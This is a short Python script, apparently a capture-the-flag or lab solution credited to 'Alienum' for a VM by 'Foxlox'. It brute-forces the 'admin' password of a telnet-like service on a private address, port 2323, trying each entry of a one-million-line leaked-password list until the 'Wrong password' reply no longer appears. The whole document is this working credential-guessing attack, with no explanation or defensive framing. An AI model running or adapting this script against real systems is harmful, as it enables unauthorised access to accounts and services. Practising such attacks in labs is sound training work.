import socket
import time
print("Script by Alienum, vm by Foxlox")
with open('10-million-password-list-top-1000000.txt') as file:
 for password in file:

    username = b"admin"
    ip = "10.0.2.108"
    port = 2323
    s = socket.socket()
    s.connect((ip, port))
    print(s.recv(1024))
    print(s.recv(1024))
    s.send(username+b'\r\n')
    print(s.recv(1024))
    s.send(password.strip().encode()+b'\r\n')
    re = s.recv(1024)
    print(re)
    print(s.recv(1024))
    print(password.strip())
    time.sleep(1.2)
    if not "Wrong password for user admin" in str(re):
       print("FOXYFOXYFOXYFOXYFOXYFOXYFOXY")
       print(password)
       break
